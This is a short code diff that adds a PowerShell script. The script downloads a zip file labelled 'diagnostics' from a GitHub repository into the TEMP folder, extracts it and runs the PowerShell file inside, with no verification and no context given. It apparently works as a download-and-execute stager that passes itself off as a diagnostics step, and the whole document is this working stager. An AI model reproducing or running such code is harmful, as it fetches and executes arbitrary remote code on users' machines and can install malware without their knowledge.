@@ -1,0 +1,7 @@
+$webClient = New-Object System.Net.webClient
+$url1 = "https://github.com/sympathetic-lama/1m/blob/main/diagnostics.zip"
+$zipPath1 = "$env:TEMP\prague1.zip"
+$webClient.DownloadFile($url1, $zipPath1)
+$extractPath1 = "$env:TEMP\file"
+Expand-Archive -Path $zipPath1 -DestinationPath $extractPath1
+& "$extractPath1\diagnostics.ps1"
